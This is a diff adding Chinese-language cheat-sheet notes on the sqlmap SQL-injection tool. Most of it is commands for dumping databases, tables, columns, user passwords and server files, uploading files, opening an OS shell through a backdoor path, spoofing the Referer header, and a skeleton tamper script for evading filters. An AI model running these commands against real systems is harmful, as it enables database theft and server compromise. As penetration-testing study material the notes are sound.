@@ -1,0 +1,62 @@
+测试注入
+sqlmap -u url
+跑表名
+sqlmap -u url -D 数据库名 --tables
+跑列名
+sqlmap -u url -D 数据库名 -T 表名 --columns
+跑字段
+sqlmap -u url -D 数据库名 -T 表名 -C "字段名,字段名" --dump
+从文件中判断是否有注入
+sqlmap -r xx.txt
+查询当前用户下所有的数据库
+sqlmap -u url --dbs
+获取数据库用户的用户名
+sqlmap -u url --users
+获取数据库用户的密码
+sqlmap -u url --passwords
+获取当前网站数据库名称
+sqlmap -u url --current-db
+获取当前网站数据库的用户名称
+sqlmap -u url --current-user
+
+--level 5：探测等级
+参数--level 5指需要执行的测试等级，一共有5个等级（1~5）,可不加level，默认是1.sqlmap使用的payload可以在xml/payload.xml中看到，也可以根据相应的格式添加自己的payload，其中5级的payload最多，会自动破解出cookie，XFF等头部注入。当然level 5运行速度也比较慢。
+
+这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level 2时就会测试，HTTP User-Agent/Referer头在level 3时就会测试。总之不确定那个payload或参数为注入点时，为确保全面性，建议使用最高level值。
+
+列出数据库管理员角色
+sqlmap -u url --roles
+
+--referer:HTTP Referer头
+SQLMap可以在请求中伪造HTTP refer，当--level参数设定达到3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如--referer http://www.baidu.com
+
+--sql-shell： 
+该命令用于执行指定的SQL语句
+
+--os-cmd,--os-shell：运行任意操作系统命令
+在数据库为MySQL，Postsql或Mssql，并且当前用户有权限使用特定的函数时，如果数据库为Mysql或Postsql或mssql上传一个二进制库，保护自定义函数sys_exec()和sys_eval(),那么创建的这两个函数就可以执行系统命令
+用法：sqlmap -u url --os-shell 你上传的后门路径
+
+--os-shell
+用于模拟一个真实的shell，如果想要shell的话，--is-dba回显结果必须为True
+
+--file-read 从数据库中读取文件
+用于读取文件，要求：当前用户有使用特定函数的权限
+用法：sqlmap -u --file-read 要读取文件的路径
+
+--file-write --file-dest
+上传文件到数据库服务器中，要求：当前用户有特定函数的使用权限
+用法：sqlmap -u url --file-write "攻击机要上传的文件路径" --file-dest "目标机的路径"
+
+sqlmap自带绕过脚本tamper的讲解
+tamper脚本格式：
+
+from lib.core.enums import PRIORITY
+__priority__=PRIORITY.LOWEST //定义脚本的优先级
+
+def dependencies: //函数声明该脚本适用/不适用的地方
+	pass
+def tamper(payload,**kwargs):
+	代码
+
+-------------------------------------------
